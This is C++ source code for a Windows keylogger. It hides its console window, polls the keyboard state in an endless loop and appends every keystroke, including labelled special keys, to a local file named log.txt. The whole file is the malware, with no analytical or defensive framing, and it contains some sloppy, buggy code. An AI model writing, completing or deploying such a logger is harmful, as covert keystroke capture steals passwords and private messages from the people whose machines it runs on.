#include <iostream>
#include<windows.h>
using namespace std;

int Save(int _key, const char *file);

int main()
{
	FreeConsole();
	char i;
	while (true) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "log.txt");
			}
		}
	}
	return 0;
}

int Save(int _key, const char *file) {
	cout << _key << endl;
	Sleep(10);
	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");
	if (_key == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if(_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	else if(_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	else if(_key == VK_RBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
	else if(_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	else if(_key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if(_key == VK_CANCEL)
		fprintf(OUTPUT_FILE, "%s", "[CANCLE]");
	else if(_key == VK_MBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[MIDDLE MOUSE BUTTON]");
	else if(_key == VK_XBUTTON1)
		fprintf(OUTPUT_FILE, "%s", "[X1]");
	else if(_key == VK_XBUTTON2)
		fprintf(OUTPUT_FILE, "%s", "[X2]");
	else if(_key == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if(_key == VK_CLEAR)
		fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
	else if(_key == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CTRL]");
	else if(_key == VK_MENU)
		fprintf(OUTPUT_FILE, "%s", "[ALT]");
	else if(_key == VK_PAUSE)
		fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
	else if(_key == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
	else if(_key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESC]");
	else if(_key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", "[SPACEBAR]");
	else if(_key == VK_PRIOR)
		fprintf(OUTPUT_FILE, "%s", "[PAGE UP]");
	else if(_key == VK_NEXT)
		fprintf(OUTPUT_FILE, "%s", "[PAGE DOWN]");
	else if(_key == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if(_key == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if(_key == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT ARROW]");
	else if(_key == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP ARROW]");
	else if(_key == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT ARROW]");
	else if(_key == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN ARROW]");
	else if(_key == VK_SELECT)
		fprintf(OUTPUT_FILE, "%s", "[SELECT]");
	else if(_key == VK_PRINT)
		fprintf(OUTPUT_FILE, "%s", "[PRINT]");
	else if(_key == VK_EXECUTE)
		fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
	else if(_key == VK_SNAPSHOT)
		fprintf(OUTPUT_FILE, "%s", "[PRINT SCREEN]");
	else if(_key == VK_INSERT)
		fprintf(OUTPUT_FILE, "%s", "[INS]");
	else if(_key == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s", "[DEL]");
	else if(_key == VK_HELP)
		fprintf(OUTPUT_FILE, "%s", "[HELP]");
	else if(_key == VK_MULTIPLY)
		fprintf(OUTPUT_FILE, "%s", "*");
	else if(_key == VK_ADD)
		fprintf(OUTPUT_FILE, "%s", "+");
	else if(_key == VK_SEPARATOR)
		fprintf(OUTPUT_FILE, "%s", "[Separator]");
	else if(_key == VK_SUBTRACT)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if(_key == VK_DECIMAL)
		fprintf(OUTPUT_FILE, "%s", "[Decimal]");
	else if(_key == VK_DIVIDE)
		fprintf(OUTPUT_FILE, "%s", "/");

	else
		fprintf(OUTPUT_FILE, "%s", &_key);
	fclose(OUTPUT_FILE);
	return 0;
}